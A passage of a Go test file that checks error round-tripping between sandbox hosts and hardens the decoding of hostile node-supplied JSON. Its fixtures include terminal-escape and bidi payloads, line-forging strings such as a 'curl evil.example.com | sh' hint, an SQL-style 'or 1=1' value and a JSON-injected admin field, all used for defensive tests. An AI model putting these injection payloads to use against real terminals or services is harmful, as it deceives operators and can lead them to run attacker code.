package ctlops

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"reflect"
	"strings"
	"testing"
	"unicode"

	"github.com/vanpelt/sparky/tools/sparkbox/internal/host"
	"github.com/vanpelt/sparky/tools/sparkbox/internal/schedule"
	"github.com/vanpelt/sparky/tools/sparkbox/internal/users"
)

// hop is the whole trip a failure takes between two machines: classify, encode,
// put it on a socket, decode, rebuild. Every assertion in this file is made
// against the far end of it, because an assertion made against ToWire's return
// value would not notice a field that JSON drops.
func hop(t *testing.T, op string, err error) *Error {
	t.Helper()
	raw, merr := json.Marshal(ToWire(op, err))
	if merr != nil {
		t.Fatalf("marshal: %v", merr)
	}
	var w WireError
	if uerr := json.Unmarshal(raw, &w); uerr != nil {
		t.Fatalf("unmarshal %s: %v", raw, uerr)
	}
	return FromWire(&w)
}

// TestWireRoundTrip is the spike this whole design rests on: a failure raised on
// one machine has to arrive on another as the same failure, or every renderer in
// the tree grows a second code path for remote sandboxes. It enumerates
// everything AsError classifies and asserts the rendering contract — the two
// exit/status accessors and the four strings each transport prints — survives.
func TestWireRoundTrip(t *testing.T) {
	cases := []struct {
		name string
		op   string
		err  error
		// check inspects the rebuilt cause. Nil means this failure has no
		// concrete host value to carry and must arrive with an empty cause.
		check func(t *testing.T, got *Error)
	}{
		{"limit", "start", &host.LimitError{Max: 2, Running: []string{"alicebox", "bobbox"}},
			func(t *testing.T, got *Error) {
				var e *host.LimitError
				if !errors.As(got, &e) {
					t.Fatalf("cause = %v, want *host.LimitError", got.Err)
				}
				// sshgw.failStart prints e.Running[0] with no nil guard, so an
				// empty slice here is a panicked SSH session, not a cosmetic loss.
				if e.Max != 2 || !reflect.DeepEqual(e.Running, []string{"alicebox", "bobbox"}) {
					t.Errorf("limit = %+v, want max 2 and both names", e)
				}
			}},
		{"capacity", "start", &host.CapacityError{RequestedMB: 8192, UsedMB: 40000, BudgetMB: 45000},
			func(t *testing.T, got *Error) {
				var e *host.CapacityError
				if !errors.As(got, &e) {
					t.Fatalf("cause = %v, want *host.CapacityError", got.Err)
				}
				if e.UsedMB != 40000 || e.BudgetMB != 45000 || e.RequestedMB != 8192 {
					t.Errorf("capacity = %+v", e)
				}
			}},
		{"quota", "create", &host.DiskQuotaError{Owner: "alice", RequestedMB: 25000, UsedMB: 90000, PoolMB: 100000},
			func(t *testing.T, got *Error) {
				var e *host.DiskQuotaError
				if !errors.As(got, &e) {
					t.Fatalf("cause = %v, want *host.DiskQuotaError", got.Err)
				}
				if e.Owner != "alice" || e.UsedMB != 90000 || e.PoolMB != 100000 || e.RequestedMB != 25000 {
					t.Errorf("quota = %+v", e)
				}
			}},
		{"missing", "rename", &host.MissingError{Noun: "sandbox", Name: "ghost"},
			func(t *testing.T, got *Error) {
				var e *host.MissingError
				if !errors.As(got, &e) {
					t.Fatalf("cause = %v, want *host.MissingError", got.Err)
				}
				if e.Noun != "sandbox" || e.Name != "ghost" {
					t.Errorf("missing = %+v", e)
				}
			}},
		{"state", "rename", &host.StateError{Code: "sandbox_archived", Msg: `sandbox "x" is archived`},
			func(t *testing.T, got *Error) {
				var e *host.StateError
				if !errors.As(got, &e) {
					t.Fatalf("cause = %v, want *host.StateError", got.Err)
				}
				if e.Code != "sandbox_archived" || e.Msg != `sandbox "x" is archived` {
					t.Errorf("state = %+v", e)
				}
			}},
		{"host disabled", "rename", &host.DisabledError{Code: "rename_disabled", Msg: "rename is not enabled on this host"},
			func(t *testing.T, got *Error) {
				var e *host.DisabledError
				if !errors.As(got, &e) {
					t.Fatalf("cause = %v, want *host.DisabledError", got.Err)
				}
				if e.Code != "rename_disabled" {
					t.Errorf("disabled = %+v", e)
				}
			}},
		{"name invalid", "create", &host.NameError{Problem: host.NameInvalid, Noun: "sandbox", Name: "Nope!"},
			nameCheck(host.NameInvalid, "sandbox", "Nope!")},
		{"name reserved", "create", &host.NameError{Problem: host.NameReserved, Noun: "sandbox", Name: "console"},
			nameCheck(host.NameReserved, "sandbox", "console")},
		{"name taken", "snapshot.create", &host.NameError{Problem: host.NameTaken, Noun: "snapshot", Name: "snap"},
			nameCheck(host.NameTaken, "snapshot", "snap")},

		// The sentinels carry no structure: Kind and Code are the whole answer,
		// and nothing downstream switches on their Go identity.
		{"key linked", "keys.add", users.ErrKeyLinked, nil},
		{"last key", "keys.rm", users.ErrLastKey, nil},
		{"no passkey", "passkey.rm", users.ErrNoSuchPasskey, nil},
		{"ambiguous passkey", "passkey.rm", users.ErrAmbiguousPasskey, nil},
		{"no schedule", "schedule.rm", schedule.ErrNotFound, nil},

		// A canceled or timed-out hop keeps its 499/504 override, which is the
		// only thing that tells a hung-up caller apart from a real fault.
		{"canceled", "pause", context.Canceled, nil},
		{"deadline", "pause", context.DeadlineExceeded, nil},

		{"not found", "pause", NotFound("pause", "sandbox", "ghost"), nil},
		{"invalid", "resize", Invalid("resize", "bad_size", "size must be between 1 and %d MB", MaxDiskMB), nil},
		{"feature disabled", "archive", Disabled("archive", "archiving isn't enabled on this host."), nil},
		{"denied", "invite", Denied("invite", "not_operator", "only operators can mint invites."), nil},

		{"stray", "pause", errors.New("boom"), nil},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Wrapped, because that is how these reach a transport in practice.
			want := AsError(tc.op, fmt.Errorf("%s: %w", tc.op, tc.err))
			got := hop(t, tc.op, fmt.Errorf("%s: %w", tc.op, tc.err))

			if got.Kind != want.Kind {
				t.Errorf("kind = %v, want %v", got.Kind, want.Kind)
			}
			if got.Op != want.Op {
				t.Errorf("op = %q, want %q", got.Op, want.Op)
			}
			if got.Code != want.Code {
				t.Errorf("code = %q, want %q", got.Code, want.Code)
			}
			if got.Msg != want.Msg {
				t.Errorf("msg = %q, want %q", got.Msg, want.Msg)
			}
			if got.Hint != want.Hint {
				t.Errorf("hint = %q, want %q", got.Hint, want.Hint)
			}
			if got.Verbatim != want.Verbatim {
				t.Errorf("verbatim = %v, want %v", got.Verbatim, want.Verbatim)
			}
			if got.ExitCode() != want.ExitCode() {
				t.Errorf("exit = %d, want %d", got.ExitCode(), want.ExitCode())
			}
			if got.HTTPStatus() != want.HTTPStatus() {
				t.Errorf("status = %d, want %d", got.HTTPStatus(), want.HTTPStatus())
			}
			if got.Error() != want.Error() {
				t.Errorf("Error() = %q, want %q", got.Error(), want.Error())
			}

			if tc.check == nil {
				if got.Err != nil {
					t.Errorf("cause = %v, want none: only the host shapes travel", got.Err)
				}
				return
			}
			tc.check(t, got)
		})
	}
}

func nameCheck(problem host.NameProblem, noun, name string) func(*testing.T, *Error) {
	return func(t *testing.T, got *Error) {
		t.Helper()
		var e *host.NameError
		if !errors.As(got, &e) {
			t.Fatalf("cause = %v, want *host.NameError", got.Err)
		}
		if e.Problem != problem || e.Noun != noun || e.Name != name {
			t.Errorf("name = %+v, want %v/%s/%s", e, problem, noun, name)
		}
	}
}

// TestWireFreshError pins that FromWire hands out a value nobody else holds.
// AsError stamps Op in place on an already-classified error, so a shared one
// would let the second caller rename the first caller's operation.
func TestWireFreshError(t *testing.T) {
	w := ToWire("pause", NotFound("", "sandbox", "ghost"))
	a, b := FromWire(w), FromWire(w)
	if a == b {
		t.Fatal("FromWire returned a shared value")
	}
	AsError("outer", a)
	if b.Op != "pause" {
		t.Errorf("stamping one copy moved the other's op to %q", b.Op)
	}
	if ToWire("x", nil) != nil || FromWire(nil) != nil {
		t.Error("nil must survive as nil so no transport needs a special case")
	}
}

// TestWireDetailsAreFloats is the hazard WireHostError exists to route around,
// pinned so nobody deletes it as duplication. json.Unmarshal turns every number
// in a map[string]any into a float64; the typed cause is the only place an int
// or an []string survives the hop.
func TestWireDetailsAreFloats(t *testing.T) {
	got := hop(t, "start", &host.LimitError{Max: 2, Running: []string{"alicebox", "bobbox"}})

	if _, ok := got.Details["max"].(float64); !ok {
		t.Errorf("details[max] = %T; the round trip makes every number a float64", got.Details["max"])
	}
	if _, ok := got.Details["max"].(int); ok {
		t.Error("details[max] asserted as int — no consumer may do this")
	}
	var limit *host.LimitError
	if !errors.As(got, &limit) {
		t.Fatal("the typed cause is the only int-safe path and it did not arrive")
	}
	if limit.Max != 2 || len(limit.Running) != 2 {
		t.Errorf("limit = %+v, want the ints and the names intact", limit)
	}
}

// TestWireParseKind: Kind rides as a string precisely so an insertion into the
// iota block cannot renumber a released wire format, which only works if the
// mapping is total in both directions.
func TestWireParseKind(t *testing.T) {
	all := []Kind{KindInternal, KindInvalid, KindNotFound, KindDenied, KindConflict,
		KindDisabled, KindLimit, KindCapacity, KindQuota, KindUpstream}
	for _, k := range all {
		got, ok := ParseKind(k.String())
		if !ok || got != k {
			t.Errorf("ParseKind(%q) = %v/%v, want %v/true", k.String(), got, ok, k)
		}
	}

	// A peer that has learned a Kind this build has not still raised a failure
	// this build must render, and a 500 is the honest rendering of it.
	for _, s := range []string{"", "not_a_kind", "Internal", "NOT_FOUND"} {
		got, ok := ParseKind(s)
		if ok || got != KindInternal {
			t.Errorf("ParseKind(%q) = %v/%v, want KindInternal/false", s, got, ok)
		}
	}
}

// TestWireNeverCarriesTheCause: an unclassified cause may name an internal
// address or a driver path, so it is logged where it happened and never
// rendered to a client. The curated Host projection is the whole exception, and
// the way to keep it the whole exception is for no field on the wire to be able
// to hold an error at all.
func TestWireNeverCarriesTheCause(t *testing.T) {
	errType := reflect.TypeOf((*error)(nil)).Elem()
	wire := reflect.TypeOf(WireError{})
	for i := 0; i < wire.NumField(); i++ {
		f := wire.Field(i)
		if f.Type.Implements(errType) || f.Type == errType {
			t.Errorf("WireError.%s can carry an error; the cause stays in the node's log", f.Name)
		}
	}
}

// The rest of this file is about the other direction of trust. A node is
// authenticated, which says who it is and not that it has stayed honest — and
// FromWire is the one place in the tree where bytes off a socket become Go
// values that renderers dereference without checking. Everything below feeds
// hostile JSON in at the socket end and asserts at the renderer end.

// mimicFailStart and mimicStartFailure are copies of the two shipped renderers,
// sshgw.failStart (gateway.go) and xterm.startFailure (ws.go). Both of those
// packages import ctlops, so neither can be imported back here, and a copy is
// the only way this package can prove that what it hands them is printable.
// They are kept deliberately literal, including the unguarded Running[0] that
// is the whole reason these bounds exist: if either original learns a field,
// this copy learns the same field and the assertions below cover it.
func mimicFailStart(err error) string {
	var limit *host.LimitError
	if errors.As(err, &limit) {
		return fmt.Sprintf("you already have %d running sandboxes (max %d): %s | pause %s",
			len(limit.Running), limit.Max, strings.Join(limit.Running, ", "), limit.Running[0])
	}
	var capacity *host.CapacityError
	if errors.As(err, &capacity) {
		return fmt.Sprintf("host is at capacity (%d/%d MB allocated)",
			capacity.UsedMB, capacity.BudgetMB)
	}
	return err.Error()
}

func mimicStartFailure(err error) string {
	var limit *host.LimitError
	if errors.As(err, &limit) {
		return fmt.Sprintf("you already have %d running sandboxes (max %d): %s — pause one and reconnect",
			len(limit.Running), limit.Max, strings.Join(limit.Running, ", "))
	}
	var capacity *host.CapacityError
	if errors.As(err, &capacity) {
		return fmt.Sprintf("the host is at capacity (%d/%d MB allocated) — try again shortly",
			capacity.UsedMB, capacity.BudgetMB)
	}
	return "the sandbox could not be started"
}

// renderNoPanic runs a renderer over a node-supplied value and turns a crash into a
// failed assertion rather than a failed test binary — a panic here is a killed
// SSH session in production, so it has to be reported as the defect it is.
func renderNoPanic(t *testing.T, what string, f func() string) (out string) {
	t.Helper()
	defer func() {
		if r := recover(); r != nil {
			t.Errorf("%s panicked on node-supplied input: %v", what, r)
		}
	}()
	return f()
}

// manyNames builds a running set no host would ever produce, as the JSON array
// body a peer could nonetheless send.
func manyNames(n int) string {
	parts := make([]string, n)
	for i := range parts {
		parts[i] = fmt.Sprintf("%q", fmt.Sprintf("box-%04d", i))
	}
	return strings.Join(parts, ",")
}

// hostileCases are payloads a node can put on the socket. cause is the concrete
// type the rebuilt error must carry, or "" when the fields cannot satisfy any
// type's invariants and the cause must therefore be dropped rather than
// half-built — Kind, Code and Msg still travel and are what every renderer
// prints. want, when set, is a substring the human must still be able to read.
var hostileCases = []struct {
	name  string
	raw   string
	cause string
	want  string
}{
	// The audit's proof of concept: a limit with no running set at all. Before
	// the bounds this rebuilt a LimitError whose Running was empty, and
	// failStart's Running[0] took the session down with it.
	{"limit without running", `{"kind":"limit","msg":"you already have 3 running sandboxes (max 3)","host":{"type":"limit","max":3}}`, "", ""},
	{"limit with empty running", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":3,"running":[]}}`, "", ""},
	{"limit with only blank names", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":3,"running":["","   ","\t\r\n"]}}`, "", ""},
	{"limit with no cap", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","running":["alicebox"]}}`, "", ""},
	{"limit with negative cap", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":-4,"running":["alicebox"]}}`, "", ""},
	{"limit with absurd cap", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":99999999999,"running":["alicebox"]}}`, "", ""},
	// A name is printed into an SSH stderr and an xterm.js buffer, so a \r that
	// forges a "sparkbox: " line and an OSC that retitles the window must not
	// survive — while the sandbox the user has to pause is still named.
	{"limit with terminal escapes in a name", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":2,"running":["\u001b]0;pwned\u0007boxone","two\r\nsparkbox: your key was stolen"]}}`,
		"*host.LimitError", "boxone"},
	{"limit with a thousand names", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":2,"running":[` + manyNames(1000) + `]}}`,
		"*host.LimitError", "box-0000"},
	{"limit with a novel for a name", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":2,"running":["` + strings.Repeat("a", 5000) + `"]}}`,
		"*host.LimitError", "aaaa"},

	{"capacity with negative numbers", `{"kind":"capacity","msg":"host at capacity","host":{"type":"capacity","requested_mb":-1,"used_mb":-9,"budget_mb":-4}}`, "", ""},
	{"capacity with no budget", `{"kind":"capacity","msg":"host at capacity","host":{"type":"capacity","requested_mb":8192,"used_mb":40000}}`, "", ""},
	{"capacity with an absurd budget", `{"kind":"capacity","msg":"host at capacity","host":{"type":"capacity","requested_mb":8192,"used_mb":40000,"budget_mb":9223372036854775807}}`, "", ""},
	{"capacity intact", `{"kind":"capacity","msg":"host at capacity","host":{"type":"capacity","requested_mb":8192,"used_mb":40000,"budget_mb":45000}}`,
		"*host.CapacityError", "40000"},

	{"quota without an owner", `{"kind":"quota","msg":"pool full","host":{"type":"quota","requested_mb":25000,"used_mb":90000,"pool_mb":100000}}`, "", ""},
	{"quota with a negative pool", `{"kind":"quota","msg":"pool full","host":{"type":"quota","owner":"alice","requested_mb":25000,"used_mb":90000,"pool_mb":-2}}`, "", ""},
	{"quota with an escaped owner", `{"kind":"quota","msg":"pool full","host":{"type":"quota","owner":"\u001b[2Jalice\r\n","requested_mb":25000,"used_mb":90000,"pool_mb":100000}}`,
		"*host.DiskQuotaError", "alice"},

	{"missing without a name", `{"kind":"not_found","msg":"not found","host":{"type":"missing","noun":"sandbox"}}`, "", ""},
	// Noun becomes half a machine token ("sandbox_not_found") wherever this is
	// reclassified, so a noun that is not a token is a peer to disbelieve.
	{"missing with a forged noun", `{"kind":"not_found","msg":"not found","host":{"type":"missing","noun":"sand box\" or 1=1","name":"ghost"}}`, "", ""},
	{"missing intact", `{"kind":"not_found","msg":"not found","host":{"type":"missing","noun":"sandbox","name":"ghost"}}`,
		"*host.MissingError", "ghost"},

	// StateError.Error() *is* its Msg: an empty one renders as nothing at all,
	// which is worse than the generic sentence the caller would otherwise get.
	{"state without a message", `{"kind":"conflict","msg":"refused","host":{"type":"state","code":"sandbox_archived"}}`, "", ""},
	{"state without a code", `{"kind":"conflict","msg":"refused","host":{"type":"state","msg":"sandbox is archived"}}`, "", ""},
	{"state with a forged code", `{"kind":"conflict","msg":"refused","host":{"type":"state","code":"archived\nx-injected: 1","msg":"sandbox is archived"}}`, "", ""},
	{"state with a novel for a message", `{"kind":"conflict","msg":"refused","host":{"type":"state","code":"sandbox_archived","msg":"` + strings.Repeat("b", 100000) + `"}}`,
		"*host.StateError", "bbbb"},
	{"disabled without a message", `{"kind":"disabled","msg":"off","host":{"type":"disabled","code":"rename_disabled"}}`, "", ""},
	{"disabled intact", `{"kind":"disabled","msg":"off","host":{"type":"disabled","code":"rename_disabled","msg":"rename is not enabled on this host"}}`,
		"*host.DisabledError", "rename is not enabled"},

	// An unrecognised NameProblem keeps a typed cause: NameError already
	// renders anything it does not know as "invalid <noun> name", so clamping
	// only makes the classification agree with the sentence.
	{"name with an unknown problem", `{"kind":"conflict","msg":"bad name","host":{"type":"name","problem":99,"noun":"sandbox","name":"Nope!"}}`,
		"*host.NameError", `invalid sandbox name "Nope!"`},
	{"name with a negative problem", `{"kind":"conflict","msg":"bad name","host":{"type":"name","problem":-5,"noun":"sandbox","name":"Nope!"}}`,
		"*host.NameError", `invalid sandbox name "Nope!"`},
	{"name without a name", `{"kind":"conflict","msg":"bad name","host":{"type":"name","problem":0,"noun":"sandbox"}}`, "", ""},
	// The refused name is the caller's own typing, so it is scrubbed and never
	// held to the name charset — "Nope!" is exactly what a NameInvalid carries.
	{"name keeps the refused spelling", `{"kind":"invalid","msg":"bad name","host":{"type":"name","problem":0,"noun":"sandbox","name":"Nope!"}}`,
		"*host.NameError", "Nope!"},

	{"unknown host type", `{"kind":"internal","msg":"boom","host":{"type":"wat","max":3}}`, "", ""},
	{"host block with nothing in it", `{"kind":"internal","msg":"boom","host":{}}`, "", ""},
	{"null host block", `{"kind":"limit","msg":"limit reached","host":null}`, "", ""},

	// Wrong-typed JSON never reaches hostFromWire at all: it fails at the
	// decoder, which is the earliest and safest place to lose it. Pinned so a
	// future move to a looser decode has to notice what it is loosening.
	{"max sent as a string", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":"three","running":["alicebox"]}}`, "", ""},
	{"running sent as a string", `{"kind":"limit","msg":"limit reached","host":{"type":"limit","max":3,"running":"alicebox"}}`, "", ""},
	{"host block sent as an array", `{"kind":"limit","msg":"limit reached","host":[1,2,3]}`, "", ""},
}

// TestWireHostileHost is the wire half of the rule that nothing a node sends may
// become a typed value violating that type's invariants. Every case is decoded
// exactly as the link decodes it, rebuilt, and then put through both terminal
// renderers — which never nil-check, never bound and never scrub what they are
// handed.
func TestWireHostileHost(t *testing.T) {
	for _, tc := range hostileCases {
		t.Run(tc.name, func(t *testing.T) {
			var w WireError
			if err := json.Unmarshal([]byte(tc.raw), &w); err != nil {
				// Rejected at the door. That is a safe outcome, but only for a
				// payload that was never supposed to yield a cause.
				if tc.cause != "" {
					t.Fatalf("decode failed on a payload that must rebuild a %s: %v", tc.cause, err)
				}
				return
			}
			got := FromWire(&w)
			if got == nil {
				t.Fatal("FromWire dropped a decoded error entirely")
			}

			cause := ""
			if got.Err != nil {
				cause = fmt.Sprintf("%T", got.Err)
			}
			// Reported and not fatal, so the renderers below still run on the
			// value that should never have been built: what the wrong cause
			// costs — a panicked session, an escape sequence, a novel — is the
			// evidence, and it is worth having in the same failure.
			if cause != tc.cause {
				t.Errorf("cause = %q, want %q — a value that cannot be rendered honestly must not be rebuilt", cause, tc.cause)
			}

			// The renderers, in the order a user meets them.
			ssh := renderNoPanic(t, "sshgw.failStart", func() string { return mimicFailStart(got) })
			term := renderNoPanic(t, "xterm.startFailure", func() string { return mimicStartFailure(got) })

			assertReadable(t, "sshgw.failStart", ssh)
			assertReadable(t, "xterm.startFailure", term)
			if got.Err != nil {
				assertReadable(t, "the cause", got.Err.Error())
				if tc.want != "" && !strings.Contains(got.Err.Error(), tc.want) {
					t.Errorf("the cause rendered %q, which no longer contains %q", got.Err.Error(), tc.want)
				}
			}
			// The two terminals only name the cause for the two shapes they
			// have a friendly branch for; for every other shape they print the
			// *Error's own sentence, which is the node's Msg and not this
			// function's business.
			var limit *host.LimitError
			var capacity *host.CapacityError
			if tc.want != "" && (errors.As(got, &limit) || errors.As(got, &capacity)) {
				if !strings.Contains(ssh, tc.want) || !strings.Contains(term, tc.want) {
					t.Errorf("a terminal line lost %q: %q / %q", tc.want, ssh, term)
				}
			}
		})
	}
}

// assertReadable is what "still sensible to a human" means concretely: a
// sentence somebody can read on a terminal that does not obey it, of a length a
// terminal can show, which does not state a fact that cannot be true.
func assertReadable(t *testing.T, where, s string) {
	t.Helper()
	if strings.TrimSpace(s) == "" {
		t.Errorf("%s rendered nothing at all", where)
		return
	}
	for _, r := range s {
		if unicode.IsControl(r) {
			t.Errorf("%s rendered %q, which drives the reader's terminal", where, s)
			break
		}
		// The bidi overrides are the same attack without a control character:
		// U+202E makes the rest of the line render right-to-left, so a sentence
		// a human reads is not the sentence that was sent.
		if r >= 0x202a && r <= 0x202e || r >= 0x2066 && r <= 0x2069 || r == 0x200e || r == 0x200f {
			t.Errorf("%s rendered %q, which reorders itself on the reader's terminal", where, s)
			break
		}
	}
	if len(s) > 4096 {
		t.Errorf("%s rendered %d bytes; nobody reads that", where, len(s))
	}
	for _, nonsense := range []string{`""`, "(max 0)", " 0 running", " -", "(-"} {
		if strings.Contains(s, nonsense) {
			t.Errorf("%s rendered %q, which contains %q and reports something that cannot be true", where, s, nonsense)
		}
	}
}

// TestWireHostileCauseIsInvisibleToTheOtherConsumers pins the price of dropping
// a cause, which is nothing. The REST projection (restapi.apiErrorOf) and both
// consoles render Kind, Code, Msg, Hint and Details and never touch Err, so a
// refused host block must leave every one of them byte-identical.
func TestWireHostileCauseIsInvisibleToTheOtherConsumers(t *testing.T) {
	const raw = `{"kind":"limit","op":"start","code":"running_limit",` +
		`"msg":"you already have 3 running sandboxes (max 3)","hint":"Pause one to free a slot.",` +
		`"details":{"max":3},"verbatim":true,"host":{"type":"limit","max":3}}`

	var w WireError
	if err := json.Unmarshal([]byte(raw), &w); err != nil {
		t.Fatalf("decode: %v", err)
	}
	got := FromWire(&w)

	if got.Err != nil {
		t.Errorf("cause = %v, want none: an empty running set cannot be rendered", got.Err)
	}
	if got.Kind != KindLimit || got.Op != "start" || got.Code != "running_limit" {
		t.Errorf("classification changed: %+v", got)
	}
	if got.Msg != w.Msg || got.Error() != w.Msg {
		t.Errorf("message = %q, want the node's %q", got.Msg, w.Msg)
	}
	if got.Hint != w.Hint || !got.Verbatim {
		t.Errorf("hint/verbatim changed: %q/%v", got.Hint, got.Verbatim)
	}
	if !reflect.DeepEqual(got.Details, w.Details) {
		t.Errorf("details = %v, want %v", got.Details, w.Details)
	}
	if want := AsError("start", &host.LimitError{Max: 3, Running: []string{"alicebox"}}); got.HTTPStatus() != want.HTTPStatus() || got.ExitCode() != want.ExitCode() {
		t.Errorf("status/exit = %d/%d, want %d/%d: dropping the cause must not move either",
			got.HTTPStatus(), got.ExitCode(), want.HTTPStatus(), want.ExitCode())
	}
}

// The remainder of this file is about the envelope rather than the cause it
// wraps. Sanitising Host and leaving WireError's own fields trusted only moved
// the problem: Msg and Hint are what the two SSH printers put on an operator's
// terminal, Status is handed to http.ResponseWriter.WriteHeader, Exit becomes
// the ctl@ process's exit status, and Details is copied verbatim into the JSON
// body of every API answer. All five are node-authored, all five are consumed
// by code that assumes the gateway wrote them.

// mimicFail and mimicFailCtl are the two shipped SSH printers, sshgw.fail
// (gateway.go) and sshgw.failCtl (control.go), kept literal — including the
// trailing CRLF, which is the line terminator the printer appends and not
// content, and which the assertions below strip before reading the line.
func mimicFail(what string, err error) string {
	return fmt.Sprintf("sparkbox: %s failed: %v\r\n", what, err)
}

func mimicFailCtl(e *Error) string {
	if !e.Verbatim {
		return mimicFail(e.Op, e)
	}
	return fmt.Sprintf("sparkbox: %s\r\n", e.Msg)
}

// mimicWriteHeader is net/http's checkWriteHeaderCode, which is what
// restapi.fail reaches when it hands e.HTTPStatus() to WriteHeader. It panics
// on anything outside [100, 999], and a panic there is a killed API request.
func mimicWriteHeader(code int) {
	if code < 100 || code > 999 {
		panic(fmt.Sprintf("invalid WriteHeader code %v", code))
	}
}

// assertAnswersAsAFailure is the rule a node must not be able to break: a
// failure has to reach an API client looking like a failure. 1xx would be
// treated as a continuation, 2xx would report success with an error envelope
// in the body, and 3xx would send the client somewhere else entirely.
func assertAnswersAsAFailure(t *testing.T, e *Error) {
	t.Helper()
	renderNoPanic(t, "http.ResponseWriter.WriteHeader", func() string {
		mimicWriteHeader(e.HTTPStatus())
		return ""
	})
	if s := e.HTTPStatus(); s < 400 || s > 599 {
		t.Errorf("HTTPStatus() = %d; a failure that does not answer 4xx/5xx reads as a success", s)
	}
}

// assertExitsAsAFailure: the SSH exit status is a uint32 on the wire, so a
// negative code arrives as two billion and a zero one tells `ctl@ … && rm -rf`
// that the command it just failed at succeeded.
func assertExitsAsAFailure(t *testing.T, e *Error) {
	t.Helper()
	if c := e.ExitCode(); c < 1 || c > 255 {
		t.Errorf("ExitCode() = %d; a failure must exit non-zero and inside a byte", c)
	}
}

// detailBytes is the size of what the REST edge copies into its answer. A node
// may write up to nodelink.MaxFrameBytes (a megabyte) per frame, and Details is
// the field with no shape of its own to stop it.
func detailBytes(t *testing.T, d map[string]any) int {
	t.Helper()
	if d == nil {
		return 0
	}
	raw, err := json.Marshal(d)
	if err != nil {
		t.Fatalf("details do not survive re-marshalling, which is what the REST edge does to them: %v", err)
	}
	return len(raw)
}

// envelopeProbes is one hostile payload per node-authored field of WireError,
// decoded exactly as the link decodes it. The reflection check in
// TestWireEveryEnvelopeFieldIsProbed is the structural half: a field added to
// WireError without a probe here fails, so the next field cannot ship trusted
// the way Status, Exit, Msg, Hint and Details did.
var envelopeProbes = []struct {
	field string
	name  string
	raw   string
	check func(t *testing.T, e *Error)
}{
	{"Kind", "an invented kind", `{"kind":"catastrophe","msg":"boom"}`,
		func(t *testing.T, e *Error) {
			if e.Kind != KindInternal {
				t.Errorf("kind = %v, want KindInternal for one this build cannot classify", e.Kind)
			}
		}},

	{"Status", "a status that panics WriteHeader", `{"kind":"internal","msg":"boom","status":999999}`,
		func(t *testing.T, e *Error) {
			if e.HTTPStatus() != 500 {
				t.Errorf("status = %d, want the kind's 500", e.HTTPStatus())
			}
		}},
	{"Status", "a negative status", `{"kind":"internal","msg":"boom","status":-1}`, nil},
	{"Status", "a status of zero-ish nonsense", `{"kind":"invalid","msg":"boom","status":42}`,
		func(t *testing.T, e *Error) {
			if e.HTTPStatus() != 400 {
				t.Errorf("status = %d, want the kind's 400", e.HTTPStatus())
			}
		}},
	// The two that need no panic to do damage: a node makes its own failure
	// answer 200 with an error envelope, or 499 with no body at all, and every
	// API client reads a success.
	{"Status", "success for a failure", `{"kind":"internal","msg":"boom","status":200}`,
		func(t *testing.T, e *Error) {
			if e.HTTPStatus() != 500 {
				t.Errorf("status = %d, want the kind's 500: a node may not answer 200 for its own failure", e.HTTPStatus())
			}
		}},
	{"Status", "a redirect", `{"kind":"internal","msg":"boom","status":302}`, nil},
	{"Status", "a continuation", `{"kind":"internal","msg":"boom","status":100}`, nil},

	{"Exit", "an exit that reports success", `{"kind":"internal","msg":"boom","exit":0}`,
		func(t *testing.T, e *Error) {
			if e.ExitCode() != 1 {
				t.Errorf("exit = %d, want the kind's 1", e.ExitCode())
			}
		}},
	{"Exit", "an exit outside a byte", `{"kind":"internal","msg":"boom","exit":100000}`, nil},
	{"Exit", "a negative exit", `{"kind":"internal","msg":"boom","exit":-9}`, nil},
	{"Exit", "an exit that is really a signal", `{"kind":"invalid","msg":"boom","exit":256}`,
		func(t *testing.T, e *Error) {
			if e.ExitCode() != 2 {
				t.Errorf("exit = %d, want the kind's 2", e.ExitCode())
			}
		}},

	// Msg and Hint are printed straight onto a terminal by both SSH printers.
	// A CR forges a "sparkbox: " line of the attacker's choosing and an ESC
	// drives the reader's emulator; neither is a sentence, so neither is shown.
	{"Msg", "a forged sparkbox line", `{"kind":"internal","msg":"boom\r\nsparkbox: your key was stolen, mail it to eve@example.com"}`,
		func(t *testing.T, e *Error) {
			if strings.Contains(e.Msg, "stolen") {
				t.Errorf("msg = %q; a message that forges a second line is not shown at all", e.Msg)
			}
		}},
	{"Msg", "an emulator escape", "{\"kind\":\"internal\",\"msg\":\"\\u001b]0;pwned\\u0007\\u001b[2Jboom\"}", nil},
	{"Msg", "a novel", `{"kind":"internal","msg":"` + strings.Repeat("a", 200000) + `"}`,
		func(t *testing.T, e *Error) {
			if len(e.Msg) > 4096 {
				t.Errorf("msg is %d bytes; a node may write a megabyte per frame and nobody reads that", len(e.Msg))
			}
		}},
	{"Msg", "nothing at all", `{"kind":"internal","msg":""}`, nil},
	{"Msg", "whitespace", `{"kind":"internal","msg":"   \t  "}`, nil},
	{"Msg", "a bidi override", "{\"kind\":\"internal\",\"msg\":\"start failed \\u202esdrawkcab\"}", nil},

	{"Hint", "a forged hint", `{"kind":"limit","msg":"limit reached","hint":"run\r\nsparkbox: curl evil.example.com | sh"}`,
		func(t *testing.T, e *Error) {
			if strings.Contains(e.Hint, "curl") {
				t.Errorf("hint = %q; advice that forges a line is not advice", e.Hint)
			}
		}},
	{"Hint", "a novel for a hint", `{"kind":"limit","msg":"limit reached","hint":"` + strings.Repeat("h", 100000) + `"}`,
		func(t *testing.T, e *Error) {
			if len(e.Hint) > 4096 {
				t.Errorf("hint is %d bytes; nobody reads that", len(e.Hint))
			}
		}},

	{"Op", "an op that forges a line", `{"kind":"internal","op":"pause\r\nsparkbox: root@host#","msg":"boom"}`,
		func(t *testing.T, e *Error) {
			if strings.Contains(e.Op, "root@host") {
				t.Errorf("op = %q; it is printed as the <what> of \"sparkbox: <what> failed\"", e.Op)
			}
		}},
	{"Op", "an op the size of a frame", `{"kind":"internal","op":"` + strings.Repeat("o", 100000) + `","msg":"boom"}`, nil},

	{"Code", "a code that is not a token", `{"kind":"internal","code":"boom\", \"admin\": true, \"x\":\"","msg":"boom"}`,
		func(t *testing.T, e *Error) {
